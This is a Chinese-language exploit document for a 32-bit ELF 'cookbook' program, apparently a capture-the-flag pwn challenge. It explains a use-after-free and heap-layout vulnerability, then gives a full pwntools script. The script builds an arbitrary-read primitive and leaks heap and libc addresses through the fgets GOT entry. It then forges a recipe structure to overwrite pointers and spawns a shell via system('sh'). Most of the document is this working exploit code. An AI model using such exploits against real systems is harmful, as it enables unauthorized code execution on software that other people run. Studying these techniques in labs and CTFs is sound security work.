# 漏洞利用文档

## 执行环境
- **程序类型**: 32位ELF二进制程序，动态链接
- **安全特性**: 
  - 无PIE（地址固定，如0x0804xxxx）
  - 栈保护（Canary）已启用
  - 部分RELRO，GOT表可写
  - NX可能启用（但通过ret2libc绕过）
- **运行依赖**: 
  - 需要libc（通过ldd获取）
  - 测试环境：Linux，使用pwntools和gdb调试
- **关键地址**: 
  - 全局变量地址固定（如食材列表0x804d094）
  - GOT表地址固定（如fgets@got.plt为0x0804d020）

## 漏洞成因
- **关键结构体**:
  - 食材结构体：大小0x90字节，包含calories(4B)、price(4B)、name(0x80B)等字段
  - 食谱结构体：大小0x40c字节，包含食材列表指针、数量列表指针、名称、说明等
  - 链表节点：8字节，包含数据指针和next指针
- **漏洞类型**: Use-After-Free (UAF) 结合堆溢出
- **具体分析**:
  - 在`sub_80487B5`（删除节点）函数中，free后未及时置空指针，导致UAF
  - 在`sub_8048B68`（设置烹饪书名称）中，用户可控分配大小，可能造成堆布局混乱
  - 通过反复分配释放烹饪书名称chunk，可重用已free的内存，操纵关键指针
  - 最终通过覆盖当前食材指针，执行任意命令

## 漏洞利用过程
利用步骤及内存变化如下：

| 步骤 | 操作描述 | 关键内存变化 | 目的 |
|------|----------|--------------|------|
| 1 | 设置用户名"MYNAME" | `0x804d0ac`指向新分配chunk | 初始化程序状态 |
| 2 | 进入主菜单 | - | 准备后续操作 |
| 3 | 读取食材列表指针 | 泄漏`ingr_list_ptr=0x87d3510` | 获取堆基址，用于计算偏移 |
| 4 | 读取fgets的GOT地址 | 泄漏`fgets_addr=0xf7e03160` | 计算libc基址和system地址 |
| 5 | 计算system地址并调用`corrupt_curr_recipe_ptr` | 当前食谱指针与烹饪书指针混淆，写入伪造数据 | 触发UAF，准备执行system |
| 6 | 交互获得shell | 程序被替换为/bin/dash，内存完全重构 | 获得完整权限 |

**详细内存演变**:
- **初始堆布局**: 稳定的食材和食谱链表，所有chunk在使用中
- **利用阶段**: 
  - 通过烹饪书名称分配操纵堆布局，创建特定chunk
  - 使当前食谱指针(`0x804d0a0`)指向烹饪书名称chunk
  - 在chunk中写入system地址和命令字符串
- **触发阶段**: 通过删除食材操作触发UAF，执行system("sh")

## Exploit
```python
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample5')
p = process('./data/sample5')
libc = elf.libc
system_off = libc.symbols['system']
fgets_off = libc.symbols['fgets']
RECIPE_LEN = 0x40c
CURR_INGR = 0x0804d09c  # 当前食材全局变量地址
INGR_LIST = 0x0804d094  # 食材列表头地址
FGETS_GOT = 0x0804d020  # fgets的GOT表地址

def sl(l):
    p.sendline(l)

def main_menu():
    p.readuntil('[R]emove cookbook name\n[q]uit\n')

def recipe_menu():
    p.readuntil('[p]rint current recipe\n[q]uit\n')

def ingr_menu():
    p.readuntil("[q]uit (doesn't save)?\n[e]xport saving changes (doesn't quit)?\n")

def read_addr(addr):
    # 利用烹饪书名称功能实现任意地址读取
    sl('c')  # 进入食谱菜单
    recipe_menu()
    sl('n')  # 创建新食谱
    recipe_menu()
    sl('d')  # 立即删除，操纵堆状态
    recipe_menu()
    sl('q')  # 退出食谱菜单
    main_menu()
    sl('g')  # 设置烹饪书名称
    p.readuntil("(hex because you're both a chef and a hacker!) : ")
    sl('{:x}'.format(RECIPE_LEN))  # 指定分配大小
    # 构造payload：填充数据+目标地址
    sl(b'\x00'*8 + b'A'*(0x7c-8) + p32(addr))
    p.readuntil('the new name of the cookbook is')
    main_menu()
    sl('c')  # 再次进入食谱菜单
    recipe_menu()
    sl('p')  # 打印食谱，触发信息泄漏
    p.readuntil('recipe type: ')
    leak = p.readuntil('total cost :')
    ret = leak[:-(len('total cost :')+2)]  # 提取泄漏的数据
    recipe_menu()
    sl('q')  # 退出
    main_menu()
    sl('R')  # 移除烹饪书名称，清理状态
    main_menu()
    return ret

def read_ptr(addr):
    # 读取完整的32位指针值
    data = b''
    while len(data) < 4:
        last_read = read_addr(addr)
        if len(last_read) == 0:
            data += b'\x00'  # 处理空读取
        else:
            data += last_read
    return u32(data[:4])  # 转换为整数

def corrupt_curr_recipe_ptr(ingr_list_ptr, system_addr):
    # 核心利用函数：通过UAF覆盖当前食谱指针
    sl('a')  # 进入食材菜单
    ingr_menu()
    sl('n')  # 新建食材
    ingr_menu()
    sl('s')  # 设置卡路里
    sl('0')  # 值为0
    ingr_menu()
    sl('p')  # 设置价格
    # 写入特定值，用于后续指针覆盖
    sl('{}'.format(u32(p32(0x804cff8))))
    ingr_menu()
    sl('q')  # 退出食材菜单
    main_menu()
    sl('c')  # 进入食谱菜单
    recipe_menu()
    sl('n')  # 新建食谱
    recipe_menu()
    sl('d')  # 删除食谱，进一步操纵堆
    recipe_menu()
    sl('q')  # 退出
    main_menu()
    sl('g')  # 设置烹饪书名称
    p.readuntil("(hex because you're both a chef and a hacker!) : ")
    sl('{:x}'.format(0x40c))  # 分配特定大小的chunk
    # 构造伪造的食谱数据结构
    fake_recipe = p32(ingr_list_ptr)+p32(CURR_INGR-4)
    sl(fake_recipe)  # 写入伪造数据
    p.readuntil('the new name of the cookbook is')
    main_menu()
    sl('c')  # 进入食谱菜单
    recipe_menu()
    sl('r')  # 移除食材操作
    p.readuntil('which ingredient to remove? ')
    sl('tomato\x00')  # 触发UAF漏洞
    recipe_menu()
    sl('q')  # 退出
    main_menu()
    sl('a')  # 再次进入食材菜单
    ingr_menu()
    sl('g')  # 给食材命名
    # 注入shell命令和system函数地址
    sl(b'sh; \x00\x00\x00\x00' + p32(system_addr)*32)

# 主利用流程
p.readuntil(b'what\'s your name?\n');p.sendline(b'MYNAME')  # 步骤1：设置用户名
main_menu()  # 步骤2：进入主菜单
ingr_list_ptr = read_ptr(INGR_LIST)  # 步骤3：泄漏堆地址
fgets_addr = read_ptr(FGETS_GOT)  # 步骤4：泄漏libc地址
# 计算关键函数地址
libc_addr = fgets_addr - fgets_off
system_addr = libc_addr + system_off
corrupt_curr_recipe_ptr(ingr_list_ptr, system_addr)  # 步骤5：触发漏洞
p.interactive()  # 步骤6：获得shell交互
```

**利用关键点**:
- 通过烹饪书名称功能实现任意地址读取，绕过ASLR
- 利用UAF使当前食谱指针指向可控内存区域
- 精心构造堆布局，在特定位置注入system地址和命令字符串
- 通过正常的菜单操作触发漏洞，避免崩溃
